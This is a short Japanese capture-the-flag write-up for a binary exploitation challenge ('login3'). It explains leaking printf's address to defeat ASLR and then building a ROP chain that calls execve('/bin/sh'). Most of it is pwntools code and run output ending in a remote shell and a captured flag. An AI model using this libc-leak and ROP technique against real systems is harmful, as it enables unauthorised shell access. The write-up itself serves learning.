## 詰まった点

libc内のアドレス：あくまでもlibcの先頭からの相対アドレス

つまり、絶対アドレスは`libcのアドレス + libc内のアドレス`となる

ゴールとしては、libc内の`/bin/sh`を動かす事である

それにはサーバ上で動くlibcのアドレスが必要となる

そこで、ASLRがONとなった状態の`printf`の絶対アドレスから、libc内の`printf`のアドレスを差し引く事で、サーバ上で動くlibcのアドレスが分かる。

そして、ROPのチェインを組む際のlibcのアドレスとして、上記で求めたサーバ上のlibcのアドレスを指定し、`execve(/bin/sh, 0)`を実行する事でシェルが取れる
```
printf = unpack(printf[:-1].ljust(8, b'\0'))
print('printf: %x' %printf)                  #7f4d9b8b0e80
print('libc printf %x' %libc.symbols.printf) #64e80

libc.address = printf - libc.symbols.printf

rop = ROP(libc)
addr_sh = libc.search(b'/bin/sh').next() 
rop.execve(addr_sh, 0, 0)
```

## exploit

```
$ python exploit.py r
[*] 'ctf/writeup/MalleusCTF/login3/login3'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to host on port 10003: Done
[*] 'ctf/writeup/MalleusCTF/login3/libc-2.27.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Loaded cached gadgets for './login3'
0x0000:         0x400873 pop rdi; ret
0x0008:         0x601020 [arg0] rdi = got.printf
0x0010:         0x4005cc puts
0x0018:         0x400782 main()
Invalid ID or password

printf: 7f4c9dc8fe80
libc printf 64e80
[*] Loaded cached gadgets for './libc-2.27.so'
libc.search(b'/bin/sh').next() 7f4c9dddee9a
0x0000:   0x7f4c9dc4ee6a pop rsi; ret
0x0008:              0x0 [arg1] rsi = 0
0x0010:   0x7f4c9dc4c55f pop rdi; ret
0x0018:   0x7f4c9dddee9a [arg0] rdi = 139967042809498
0x0020:   0x7f4c9dd0fe30 execve
[*] Switching to interactive mode
Invalid ID or password
$ ls
flag.txt
login3
login3.sh
$ cat flag.txt
FLAG{vOvF4gQyzrRq50eH}
$
[*] Closed connection to host port 10003
```
